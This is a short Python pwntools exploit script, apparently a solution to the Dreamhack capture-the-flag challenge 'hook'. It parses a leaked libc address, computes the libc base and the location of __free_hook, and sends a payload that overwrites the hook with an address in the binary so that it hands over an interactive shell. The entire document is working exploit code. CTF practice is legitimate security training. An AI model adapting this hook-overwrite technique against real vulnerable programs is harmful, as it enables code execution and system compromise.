from pwn import *

p = process('./hook')
#p = remote('host3.dreamhack.games', 18233)
e = ELF('./hook', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
#gdb.attach(p, api=True)

p.recvuntil(b'stdout: ')
libc_leak = int(p.recvline()[:-1], 16)
libc_address = libc_leak - 0x3c5620
free_hook = libc_address + libc.sym['__free_hook']
log.info('libc leak: ' + hex(libc_leak))
log.info('libc address: ' + hex(libc_address))

payload = p64(free_hook) + p64(0x0000000000400a11)
p.sendlineafter(b'Size: ', b'128')
p.sendlineafter(b'Data: ', payload)

p.interactive()
